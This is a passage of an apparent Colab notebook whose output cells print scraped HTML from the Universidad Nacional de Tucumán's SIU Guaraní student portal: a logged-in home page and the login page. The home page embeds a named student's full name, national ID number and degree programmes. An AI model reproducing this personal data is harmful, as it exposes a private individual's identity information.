id=\\'porcentaje_avance_carrera\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/porcentaje_avance_carrera\\'>Promedio y porcentaje de avance en la carrera</a></li>\\n                        \\n                        \\n        \\n        \\n    </ul>\\n\\n    \\n\\n                                        </li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                        <li class=\\'dropdown js-menuitem-root \\'>\\n                                                \\n        \\n            <a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\">Encuestas <b class=\"caret\"></b></a>\\n    \\n    <ul class=\\'dropdown-menu\\'>\\n\\n                                    \\n                                    \\n                                        <li id=\\'encuestas_kolla\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/encuestas_kolla\\'>Encuestas Pendientes</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'encuestas_respondidas\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/encuestas_respondidas\\'>Encuestas respondidas</a></li>\\n                        \\n                        \\n        \\n        \\n    </ul>\\n\\n    \\n\\n                                        </li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                        <li class=\\'dropdown js-menuitem-root \\'>\\n                                                \\n        \\n            <a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\">Trámites <b class=\"caret\"></b></a>\\n    \\n    <ul class=\\'dropdown-menu\\'>\\n\\n                                    \\n                                    \\n                                        <li id=\\'orientacion\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/orientacion\\'>Orientación</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'solicitudes\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/solicitudes\\'>Solicitar Constancias y Certificados</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'preinscripcion\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/preinscripcion\\'>Preinscripción a Propuestas</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'solicitar_certificacion\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/solicitar_certificacion\\'>Solicitar Certificación</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'reasignar_optativa\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/reasignar_optativa\\'>Reasignar Optativa</a></li>\\n                        \\n                        \\n                    \\n                        \\n                                \\n                                                \\n                                    \\n                                    \\n                        \\n                    \\n                                    \\n                                        <li id=\\'convocatorias_becas\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/convocatorias_becas\\'>Convocatorias a Becas</a></li>\\n                        \\n                        \\n                    \\n                                    \\n                                        <li id=\\'diploma_digital\\'><a href=\\'https://guarani.unt.edu.ar:443/autogestion/diploma_digital\\'>Descargar Analítico y Diploma Digital</a></li>\\n                        \\n                        \\n                    \\n                                        \\n                                \\n                        \\n                                    \\n                        \\n        \\n        \\n    </ul>\\n\\n    \\n\\n                                        </li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                                                                                                                    \\t\\t\\t\\t\\t\\t<li id=\\'datos_censales\\' class=\\'js-menuitem-root \\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"no-ajax\" href=\\'https://guarani.unt.edu.ar:443/autogestion/datos_censales\\'>Mis datos personales</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t                                \\n                                                                                                                                            <li class=\\'dropdown js-menuitem-root menu-item-curso\\'>\\n                                        <a href=\"https://guarani.unt.edu.ar:443/autogestion/acceso/perfil?id=Cursos\" class=\"no-ajax toogle-curso\" title=\"\" data-toggle=\"popover\" data-placement=\"bottom\" data-content=\"Acceso a cursos disponibles para la comunidad\" data-original-title=\"\" data-trigger=\"hover\">Cursos</a>\\n                                    </li>\\n                                                                                                        \\t\\t\\t\\t</ul>\\n\\t\\t\\t\\t\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t<ul id=\"js-selector-perfiles\" class=\"nav pull-right perfiles\">\\n\\t\\t\\t\\t\\t\\t<li class=\"dropdown\">\\n\\t\\t\\t\\t\\t\\t<a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\"><span class=\\'js-texto-perfil\\'></span> <b class=\"caret\"></b></a>\\n\\t\\t\\t\\t\\t\\t<ul class=\"dropdown-menu\" id=\"js-select-perfil\">\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t<li data-perfil=\"Alumno\" data-perfilnombre=\"Alumno\" class=\\'js-seleccion-perfil js-perfil-item\\'>\\n\\t\\t\\t\\t\\t\\t\\t\\t<a href=\"#\"><i class=\"icon-ok\"></i> Alumno</a>\\n\\t\\t\\t\\t\\t\\t\\t\\t</li>\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t<li data-perfil=\"Cursos\" class=\"js-perfil-item\"><a href=\"#\">Cursos</a></li>\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t</ul>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\t\\t\\t\\t\\t</ul>\\n\\t\\t\\t\\t\\t\\t\\t</div><!--/.nav-collapse -->\\n\\t\\t</div><!-- container-fluid -->\\n\\t</div><!-- navbar-inner -->\\n</div><!-- navbar -->\\n\\n<!-- https://gist.github.com/tentacode/3892186 -->\\n\\n        <div id=\\'loading\\'></div>\\n\\t\\t<div id=\\'loading_top\\' style=\\'display:none;\\'>Cargando...</div>\\n\\t\\t<div id=\\'_msg_placeholder\\' style=\\'display:none;\\' class=\"msg_placeholder alert-success\"></div>\\n\\t\\t<div id=\\'kernel_contenido\\' class=\"container\">\\n\\t\\t\\t\\t\\t\\t\\n<div class=\\'titulo_operacion row-fluid\\'>\\n    <div class=\"span12\">\\n\\t<h2>Hola Pablo Guillermo Contreras </h2>    </div>\\n</div>\\n\\n<div id=\\'layout_dos_columnas\\' class=\"row-fluid\">\\n    <div id=\\'columna_1\\' class=\"span9\"><h3> Para ver la oferta del Campus Virtual Universitario Nacional,\\n<a class=\"no-ajax\" target=\"_blank\" href=\"https://campusvirtual.cin.edu.ar/\">hacé click acá</a></h3>  \\n        \\n    \\n        \\n                \\n    \\n    <div class=\\'row-fluid\\'>\\n\\n        \\n            <div class=\\'span5\\'>\\n                <div id=\\'lista_carreras\\'  class=\\'pagelet\\'></div>\\n            </div>\\n            <div class=\\'span7\\'>\\n                <div id=\\'lista_encuestas_pendientes\\'  class=\\'pagelet\\'></div>\\n            </div>\\n\\n        \\n    </div>\\n</div>\\n    <div id=\\'columna_2\\' class=\"span3\">        <div id=\\'notificaciones\\' aria-live=\\'polite\\' class=\"pagelet\"></div>\\n</div>\\n</div>\\n\\t\\t\\t<script type=\\'text/javascript\\'>kernel.renderer.on_arrival({\"css\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/inicio_alumno\\\\/lista_carreras\\\\/default.css\"],\"js\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/inicio_alumno\\\\/lista_carreras\\\\/pagelet_lista_carreras.js\"],\"op\":\"inicio_alumno\",\"info\":{\"id\":\"lista_carreras\",\"visible\":\"1\",\"estado\":\"inicial\",\"mensajes\":{\"no_existe_periodo_vigente\":\"No existe per\\\\u00edodo de inscripci\\\\u00f3n vigente.\",\"periodo_comienza\":\"El pr\\\\u00f3ximo per\\\\u00edodo de inscripci\\\\u00f3n comienza el d\\\\u00eda\"},\"existe_periodo_de_inscripcion_actividades\":\"https:\\\\/\\\\/guarani.unt.edu.ar:443\\\\/autogestion\\\\/cursada\\\\/existe_periodo_de_inscripcion\"},\"content\":\"<ul class=\\'unstyled\\'><h3>Per\\\\u00edodos lectivos<\\\\/h3><li><h4>2023 - Anual - FACET<\\\\/h4><div class=\\\\\"box-materia\\\\\"><ul><li><strong>Tipo: <\\\\/strong><span>anual<\\\\/span><\\\\/li><li><strong>Fechas del per\\\\u00edodo lectivo: <\\\\/strong><\\\\/li><ul><li><strong>Inicio: <\\\\/strong><span>13\\\\/03\\\\/2023<\\\\/span><\\\\/li><li><strong>Finalizaci\\\\u00f3n: <\\\\/strong><span>31\\\\/03\\\\/2024<\\\\/span><\\\\/li><\\\\/ul><li><strong>Per\\\\u00edodo de inscripci\\\\u00f3n #1: <\\\\/strong><\\\\/li><ul><li><strong>Inicio: <\\\\/strong><span>20\\\\/03\\\\/2023<\\\\/span><\\\\/li><li><strong>Finalizaci\\\\u00f3n: <\\\\/strong><span>24\\\\/03\\\\/2023<\\\\/span><\\\\/li><\\\\/ul><button data-target=\\\\\"js-qr-per_lecc546b7102393c6a7109443bd154db7a527b3c22e0\\\\\" class=\\\\\"btn js-btn-qr-per_lec\\\\\"><span class=\\\\\"glyphicon icon-qrcode\\\\\"><\\\\/span> Agendalo!<\\\\/button><img id=\\\\\"js-qr-per_lecc546b7102393c6a7109443bd154db7a527b3c22e0\\\\\" src=\\\\\"https:\\\\/\\\\/guarani.unt.edu.ar:443\\\\/autogestion\\\\/inicio_alumno\\\\/qr_periodo\\\\/c546b7102393c6a7109443bd154db7a527b3c22e$0\\\\\" class=\\\\\"hide\\\\\" \\\\/><li><strong>Per\\\\u00edodo de inscripci\\\\u00f3n #2: <\\\\/strong><\\\\/li><ul><li><strong>Inicio: <\\\\/strong><span>01\\\\/04\\\\/2023<\\\\/span><\\\\/li><li><strong>Finalizaci\\\\u00f3n: <\\\\/strong><span>30\\\\/04\\\\/2023<\\\\/span><\\\\/li><\\\\/ul><button data-target=\\\\\"js-qr-per_lecc546b7102393c6a7109443bd154db7a527b3c22e1\\\\\" class=\\\\\"btn js-btn-qr-per_lec\\\\\"><span class=\\\\\"glyphicon icon-qrcode\\\\\"><\\\\/span> Agendalo!<\\\\/button><img id=\\\\\"js-qr-per_lecc546b7102393c6a7109443bd154db7a527b3c22e1\\\\\" src=\\\\\"https:\\\\/\\\\/guarani.unt.edu.ar:443\\\\/autogestion\\\\/inicio_alumno\\\\/qr_periodo\\\\/c546b7102393c6a7109443bd154db7a527b3c22e$1\\\\\" class=\\\\\"hide\\\\\" \\\\/><\\\\/ul><\\\\/div><\\\\/li><li><h4>2023 - 1er Cuatrimestre - FACET<\\\\/h4><div class=\\\\\"box-materia\\\\\"><ul><li><strong>Tipo: <\\\\/strong><span>cuatrimestre<\\\\/span><\\\\/li><li><strong>Fechas del per\\\\u00edodo lectivo: <\\\\/strong><\\\\/li><ul><li><strong>Inicio: <\\\\/strong><span>01\\\\/04\\\\/2023<\\\\/span><\\\\/li><li><strong>Finalizaci\\\\u00f3n: <\\\\/strong><span>30\\\\/07\\\\/2023<\\\\/span><\\\\/li><\\\\/ul><li><strong>Per\\\\u00edodo de inscripci\\\\u00f3n #1: <\\\\/strong><\\\\/li><ul><li><strong>Inicio: <\\\\/strong><span>20\\\\/03\\\\/2023<\\\\/span><\\\\/li><li><strong>Finalizaci\\\\u00f3n: <\\\\/strong><span>24\\\\/03\\\\/2023<\\\\/span><\\\\/li><\\\\/ul><button data-target=\\\\\"js-qr-per_lec696ebaace5c034626c8b04c2f9c0bad4324f912a0\\\\\" class=\\\\\"btn js-btn-qr-per_lec\\\\\"><span class=\\\\\"glyphicon icon-qrcode\\\\\"><\\\\/span> Agendalo!<\\\\/button><img id=\\\\\"js-qr-per_lec696ebaace5c034626c8b04c2f9c0bad4324f912a0\\\\\" src=\\\\\"https:\\\\/\\\\/guarani.unt.edu.ar:443\\\\/autogestion\\\\/inicio_alumno\\\\/qr_periodo\\\\/696ebaace5c034626c8b04c2f9c0bad4324f912a$0\\\\\" class=\\\\\"hide\\\\\" \\\\/><li><strong>Per\\\\u00edodo de inscripci\\\\u00f3n #2: <\\\\/strong><\\\\/li><ul><li><strong>Inicio: <\\\\/strong><span>27\\\\/03\\\\/2023<\\\\/span><\\\\/li><li><strong>Finalizaci\\\\u00f3n: <\\\\/strong><span>15\\\\/08\\\\/2023<\\\\/span><\\\\/li><\\\\/ul><button data-target=\\\\\"js-qr-per_lec696ebaace5c034626c8b04c2f9c0bad4324f912a1\\\\\" class=\\\\\"btn js-btn-qr-per_lec\\\\\"><span class=\\\\\"glyphicon icon-qrcode\\\\\"><\\\\/span> Agendalo!<\\\\/button><img id=\\\\\"js-qr-per_lec696ebaace5c034626c8b04c2f9c0bad4324f912a1\\\\\" src=\\\\\"https:\\\\/\\\\/guarani.unt.edu.ar:443\\\\/autogestion\\\\/inicio_alumno\\\\/qr_periodo\\\\/696ebaace5c034626c8b04c2f9c0bad4324f912a$1\\\\\" class=\\\\\"hide\\\\\" \\\\/><\\\\/ul><\\\\/div><\\\\/li><\\\\/ul><ul class=\\'unstyled\\'><h3>Turnos de examen<\\\\/h3><\\\\/ul><div id=\\\\\"myModall\\\\\" class=\\\\\"modal hide fade\\\\\"><div class=\\\\\"modal-header\\\\\"><button type=\\\\\"button\\\\\" class=\\\\\"close\\\\\" data-dismiss=\\\\\"modal\\\\\" aria-hidden=\\\\\"true\\\\\">&times;<\\\\/button><h3 class=\\\\\"modalTitle\\\\\">Aviso de Inscripci\\\\u00f3n<\\\\/h3><\\\\/div><div class=\\\\\"modal-body\\\\\"><div id=\\\\\"mensajeModal\\\\\"><\\\\/div><\\\\/div><div class=\\\\\"modal-footer\\\\\"><button href=\\\\\"#\\\\\" class=\\\\\"btn btn-primary\\\\\" data-dismiss=\\\\\"modal\\\\\">Confirmar<\\\\/button><\\\\/div><\\\\/div>\",\"clase_js\":\"lista_carreras\",\"tiene_archivo_js\":\"1\"});</script><script type=\\'text/javascript\\'>kernel.renderer.on_arrival({\"css\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/inicio_alumno\\\\/lista_encuestas_pendientes\\\\/default.css\"],\"js\":[],\"op\":\"inicio_alumno\",\"info\":{\"id\":\"lista_encuestas_pendientes\",\"visible\":\"1\",\"estado\":\"inicial\",\"mensajes\":[]},\"content\":\"<ul class=\\'unstyled\\'><h3>Encuestas pendientes<\\\\/h3><div class=\\\\\"alert alert-warning text-center text-warning\\\\\">No hay encuestas pendientes para completar<\\\\/div><\\\\/ul>\",\"clase_js\":\"lista_encuestas_pendientes\",\"tiene_archivo_js\":\"\"});</script><script type=\\'text/javascript\\'>kernel.renderer.on_arrival({\"css\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/_comun\\\\/pagelets\\\\/notificaciones\\\\/default.css\"],\"js\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/_comun\\\\/pagelets\\\\/notificaciones\\\\/pagelet_notificaciones.js\",\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/js\\\\/notificaciones.js\"],\"op\":\"_comun\\\\/pagelets\",\"info\":{\"id\":\"notificaciones\",\"visible\":\"1\",\"estado\":\"inicial\",\"mensajes\":{\"error_subcomision\":\"notificaciones.errores.subcomision\"},\"persona\":{\"apellido\":\"Contreras\",\"nombres\":\"Pablo Guillermo\",\"tipo_documento_desc_abreviada\":\"DNI\",\"nro_documento\":\"38185209\",\"propuestas\":\"Ingenier\\\\u00eda Geod\\\\u00e9sica y Geof\\\\u00edsica, Licenciatura en F\\\\u00edsica\",\"institucion\":\"Universidad Nacional de Tucum\\\\u00e1n\",\"ras_nombre\":\"GRADO - Facultad de Ciencias Exactas y Tecnolog\\\\u00eda\"},\"banda_horaria_cursado\":{\"hmin\":\"07:30:00\",\"hmax\":\"22:00:00\",\"min\":\"07:00:00\",\"max\":\"22:00:00\"},\"asignaciones\":[],\"url_refresh\":\"https:\\\\/\\\\/guarani.unt.edu.ar:443\\\\/autogestion\\\\/inicio_alumno\\\\/info_notificaciones\"},\"content\":\"                <h3>Inscripciones<\\\\/h3>\\\\n        \\\\t\\\\t<select id=\\'eleccion-periodo\\' class=\\\\\"span12\\\\\">\\\\n\\\\t\\\\t    <option value=\\'quincena\\'>Quincena<\\\\/option> \\\\n\\\\t\\\\t    <option value=\\'mes\\'>Mes<\\\\/option> \\\\n\\\\t\\\\t    <option value=\\'trimestre\\'>Trimestre<\\\\/option> \\\\n\\\\t\\\\t    <option value=\\'cuatrimestre\\' selected>Cuatrimestre<\\\\/option> \\\\n\\\\t\\\\t    <option value=\\'semestre\\'>Semestre<\\\\/option> \\\\n\\\\t\\\\t<\\\\/select>\\\\n\\\\n\\\\t    <div class=\\\\\"coda-slider-wrapper\\\\\">\\\\n\\\\t\\\\t    <div class=\\\\\"scrollable\\\\\" id=\\\\\"asignaciones_cursada\\\\\"><\\\\/div>\\\\n\\\\t\\\\t    <!--<div>\\\\n\\\\t\\\\t\\\\t    <div id=\\\\\"coda-nav-left-1\\\\\" class=\\\\\"coda-nav-left\\\\\"><a href=\\\\\"#\\\\\" title=\\\\\"Slide left\\\\\">&#171;<\\\\/a><\\\\/div>\\\\n\\\\t\\\\t\\\\t    <div id=\\\\\"coda-nav-right-1\\\\\" class=\\\\\"coda-nav-right\\\\\"><a href=\\\\\"#\\\\\" title=\\\\\"Slide right\\\\\">&#187;<\\\\/a><\\\\/div>\\\\n\\\\t\\\\t    <\\\\/div>-->\\\\n\\\\t    <\\\\/div>\\\\n\\\\t    <div id=\\\\\"asignaciones_cursada_mensajes\\\\\">\\\\n\\\\t    <\\\\/div>\\\\n                <hr\\\\/>\\\\n        <h3>Inscripci\\\\u00f3n a ex\\\\u00e1menes<\\\\/h3>\\\\n\\\\t\\\\t\\\\t\\\\t\\\\t\\\\t\\\\t<p>Los ex\\\\u00e1menes a los que te inscribas aparecer\\\\u00e1n aqu\\\\u00ed.<\\\\/p>\\\\n\\\\t\\\\t\\\\t    \",\"clase_js\":\"notificaciones\",\"tiene_archivo_js\":\"1\"});</script><script type=\\'text/javascript\\'>kernel_config.pagelet_count = 3</script>\\n\\t\\t\\t\\t\\t</div>\\n        \\n        <footer>\\n    <div class=\\'container\\'>\\n\\t<div class=\"row\">\\n\\t    <div class=\"span6\">\\n\\t\\t<div id=\\'copyleft\\'>\\n\\n\\t\\t</div>\\n\\t    </div>\\n\\t    <div class=\"span6\">\\n\\t\\t<div id=\\'copyright\\'>\\n\\n\\t\\t</div>\\n\\t    </div>\\n\\t</div>\\n    </div>\\n</footer>\\n\\t\\t<a id=\"back-to-top\" href=\"#\" class=\"btn btn-inverse btn-large\" role=\"button\" title=\"Ir arriba\">\\n\\t\\t\\t<i class=\"fa fa-chevron-up\" aria-hidden=\"true\"></i>\\n\\t\\t</a>\\n\\n    </body>\\n</html>'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 26
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "l[1]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 938
        },
        "id": "H5_Pdm84ewG3",
        "outputId": "e99e3570-beb4-425b-bdb9-1891a1ad6e41"
      },
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'<!DOCTYPE html>\\n<html>\\n    <head>\\n        \\n\\t\\t    \\t\\n\\t\\n\\n\\n\\n\\n\\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0\">\\n<link rel=\"icon\" href=\"/autogestion/_comp/siu/img/favicon.ico\" type=\"image/x-icon\" />\\n\\n<title>SIU Guaraní - Acceso</title>\\n\\n\\t<script type=\\'text/javascript\\' src=\\'/autogestion/_comp/siu/js/guarani_mash.js\\' charset=\"iso-8859-1\"></script>\\n\\t\\t\\t<link type=\\'text/css\\' href=\\'/autogestion/_comp/siu/css/guarani_mash.css\\' rel=\\'stylesheet\\' />\\n\\t\\t\\t\\n    <!-- No se agrega en \"guarani_mash.css\" porque sino pierde la referencia de las fuentes -->\\n    <link type=\\'text/css\\' href=\\'/autogestion/css/font-awesome-4.6.3/css/font-awesome.min.css\\' rel=\\'stylesheet\\' />\\n\\n\\n\\n<!--[if lt IE 9]>\\n\\t<script type=\\'text/javascript\\' src=\\'/autogestion/_comp/js/html5.js\\'></script>\\n<![endif]-->\\n\\n\\t \\n\\t\\n<script type=\\'text/javascript\\'>\\nvar kernel_config = {\\n\\twidget_count: 2,\\n\\t// Stalls js load until all widgets have loaded css and rendered its content\\n\\tstall_js: false,\\n\\tlog: true,\\n\\talias: \\'/autogestion\\',\\n\\tpretty_urls: true,\\n\\top_default: \\'acceso\\',\\n\\top_actual: \\'acceso\\',\\n\\thistoria_activa: false,\\n\\t\\tes_produccion: true\\n};\\nvar url_cambio_perfil = \"\";\\nvar url_cambio_carrera = \"\";\\n\\nvar autocompletar_input_habilitado = false;\\n\\n</script>\\n    </head>\\n    \\n    <body>\\n        <div class=\"brand-nav\">\\n    <div class=\"container\">\\n\\t\\t<div class=\"row-fluid\">\\n\\t\\t\\t<div class=\"span3\">\\n\\t\\t\\t\\t<a class=\"brand\" href=\"https://guarani.unt.edu.ar:443/autogestion/acceso\"><img src=\"/autogestion/_comp/siu/img/logo-transparente.png\" /></a>\\n\\t\\t\\t</div>\\n\\n\\t\\t\\t<div class=\"span9\">\\n\\t\\t\\t\\t\\t\\t</div>\\n\\t\\t</div>\\n    </div>\\n</div>\\n<div class=\"navbar main-nav\">\\n\\t<div class=\"navbar-inner\">\\n\\t\\t<div class=\"container\">\\n\\t\\t\\t<div role=\"navigation\">\\n\\t\\t\\t\\t\\t\\t\\t\\t<ul id=\\'js-nav\\' class=\\'nav\\'>\\n                                    \\n                                                                \\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                \\t\\t\\t\\t\\t\\t<li id=\\'acceso\\' class=\\'js-menuitem-root menu-item-seleccionado\\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"\" href=\\'https://guarani.unt.edu.ar:443/autogestion/acceso\\'>Acceso</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                \\t\\t\\t\\t\\t\\t<li id=\\'fecha_examen\\' class=\\'js-menuitem-root \\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"\" href=\\'https://guarani.unt.edu.ar:443/autogestion/fecha_examen\\'>Fechas de Examen</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                \\t\\t\\t\\t\\t\\t<li id=\\'horarios_cursadas\\' class=\\'js-menuitem-root \\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"\" href=\\'https://guarani.unt.edu.ar:443/autogestion/horarios_cursadas\\'>Horarios de Cursadas</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                \\t\\t\\t\\t\\t\\t<li id=\\'validador_certificados\\' class=\\'js-menuitem-root \\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"\" href=\\'https://guarani.unt.edu.ar:443/autogestion/validador_certificados\\'>Validador de Certificados</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\n                                                                                                                                                \\t\\t\\t\\t\\t\\t<li id=\\'ayuda_menu\\' class=\\'js-menuitem-root \\'>\\n\\t\\t\\t\\t\\t\\t\\t<a class=\"\" href=\\'https://guarani.unt.edu.ar:443/autogestion/ayuda_menu\\'>Ayuda</a>\\n\\t\\t\\t\\t\\t\\t</li>\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t                                \\n                    \\t\\t\\t\\t</ul>\\n\\t\\t\\t\\t\\n\\t\\t\\t\\t\\t\\t\\t</div><!--/.nav-collapse -->\\n\\t\\t</div><!-- container-fluid -->\\n\\t</div><!-- navbar-inner -->\\n</div><!-- navbar -->\\n\\n<!-- https://gist.github.com/tentacode/3892186 -->\\n\\n        <div id=\\'loading\\'></div>\\n\\t\\t<div id=\\'loading_top\\' style=\\'display:none;\\'>Cargando...</div>\\n\\t\\t<div id=\\'_msg_placeholder\\' style=\\'display:none;\\' class=\"msg_placeholder alert-success\"></div>\\n\\t\\t<div id=\\'kernel_contenido\\' class=\"container\">\\n\\t\\t\\t\\t\\t\\t\\n<div id=\\'layout_dos_columnas\\' class=\"row-fluid\">\\n    <div id=\\'columna_1\\' class=\"span5\">\\t<div id=\\'login\\'  class=\\'pagelet\\'></div>\\n</div>\\n    <div id=\\'columna_2\\' class=\"span7\">\\t<div id=\\'contenido_login\\'  class=\\'pagelet\\'></div>\\n</div>\\n</div>\\n\\n\\t\\t\\t<script type=\\'text/javascript\\'>kernel.renderer.on_arrival({\"css\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/acceso\\\\/contenido_login\\\\/default.css\"],\"js\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/acceso\\\\/contenido_login\\\\/pagelet_contenido_login.js\"],\"op\":\"acceso\",\"info\":{\"id\":\"contenido_login\",\"visible\":\"1\",\"estado\":\"inicial\",\"mensajes\":[]},\"content\":\"<h2>SIU Guaran\\\\u00ed<\\\\/h2><p>Algunas de las cosas que pod\\\\u00e9s hacer con este sistema son:<\\\\/p><ul><li>Inscribirte a materias y ex\\\\u00e1menes.<\\\\/li><li>Consultar el plan de tu propuesta.<\\\\/li><li>Consultar tu historia acad\\\\u00e9mica.<\\\\/li><li>Actualizar tus datos personales.<\\\\/li><li>Recibir alertas sobre per\\\\u00edodos de inscripci\\\\u00f3n o vencimiento de ex\\\\u00e1menes finales.<\\\\/li><\\\\/ul>\",\"clase_js\":\"contenido_login\",\"tiene_archivo_js\":\"1\"});</script><script type=\\'text/javascript\\'>kernel.renderer.on_arrival({\"css\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/acceso\\\\/login\\\\/default.css\"],\"js\":[\"\\\\/autogestion\\\\/_comp\\\\/siu\\\\/operaciones\\\\/acceso\\\\/login\\\\/pagelet_login.js\"],\"op\":\"acceso\",\"info\":{\"id\":\"login\",\"visible\":\"1\",\"estado\":\"inicial\",\"mensajes\":{\"id_requerido\":\"El nombre de usuario es requerido. <br\\\\/>Por favor intenta de nuevo.\",\"clave_requerida\":\"La contrase\\\\u00f1a es requerida. <br\\\\/>Por favor intenta de nuevo.\"}},\"content\":\"<hr\\\\/><script src=\\\\\"https:\\\\/\\\\/www.google.com\\\\/recaptcha\\\\/api.js?hl=es-419&render=onload\\\\\" async defer><\\\\/script><h2>Ingres\\\\u00e1 tus datos<\\\\/h2><form method=\\\\\"post\\\\\" action=\\\\\"https:\\\\/\\\\/guarani.unt.edu.ar:443\\\\/autogestion\\\\/acceso?auth=form\\\\\" id=\\\\\"guarani_form_login\\\\\"><div class=\\\\\"control-group\\\\\"><label class=\\\\\"control-label\\\\\" for=\\\\\"usuario\\\\\">Usuario<\\\\/label><div class=\\\\\"controls\\\\\"><input id=\\\\\"usuario\\\\\" name=\\\\\"usuario\\\\\" type=\\\\\"text\\\\\" value=\\\\\"\\\\\" maxlength=\\\\\"60\\\\\"\\\\/><\\\\/div><\\\\/div><div class=\\\\\"control-group\\\\\"><label class=\\\\\"control-label\\\\\" for=\\\\\"password\\\\\">Contrase\\\\u00f1a<\\\\/label><div class=\\\\\"controls\\\\\"><input id=\\\\\"password\\\\\" name=\\\\\"password\\\\\" type=\\\\\"password\\\\\" value=\\\\\"\\\\\" maxlength=\\\\\"20\\\\\"\\\\/><\\\\/div><\\\\/div><div class=\\\\\"control-group\\\\\"><div class=\\\\\"controls\\\\\"><input id=\\\\\"login\\\\\"  name=\\\\\"login\\\\\" type=\\\\\"submit\\\\\" value=\\\\\"Ingresar\\\\\" class=\\\\\"btn btn-info\\\\\"\\\\/><\\\\/div><\\\\/div><\\\\/form><a href=\\'https:\\\\/\\\\/guarani.unt.edu.ar:443\\\\/autogestion\\\\/acceso\\\\/recuperar\\'>\\\\u00bfOlvidaste tu contrase\\\\u00f1a o sos un usuario nuevo?<\\\\/a><hr\\\\/>\\\\n        Si dese\\\\u00e1s inscribirte a cursos, <strong>y no ten\\\\u00e9s usuario y clave de acceso al sistema<\\\\/strong>, pod\\\\u00e9s crearlo accediendo <a href=\\\\\"https:\\\\/\\\\/guarani.unt.edu.ar:443\\\\/autogestion\\\\/alta_usuario_cursos\\\\\">aqu\\\\u00ed<\\\\/a>.\\\\n        \\\\n    <hr\\\\/>\",\"clase_js\":\"login\",\"tiene_archivo_js\":\"1\"});</script><script type=\\'text/javascript\\'>kernel_config.pagelet_count = 2</script>\\n\\t\\t\\t\\t\\t</div>\\n        \\n        <footer>\\n    <div class=\\'container\\'>\\n\\t<div class=\"row\">\\n\\t    <div class=\"span6\">\\n\\t\\t<div id=\\'copyleft\\'>\\n\\n\\t\\t</div>\\n\\t    </div>\\n\\t    <div class=\"span6\">\\n\\t\\t<div id=\\'copyright\\'>\\n\\n\\t\\t</div>\\n\\t    </div>\\n\\t</div>\\n    </div>\\n</footer>\\n\\t\\t<a id=\"back-to-top\" href=\"#\" class=\"btn btn-inverse btn-large\" role=\"button\" title=\"Ir arriba\">\\n\\t\\t\\t<i class=\"fa fa-chevron-up\" 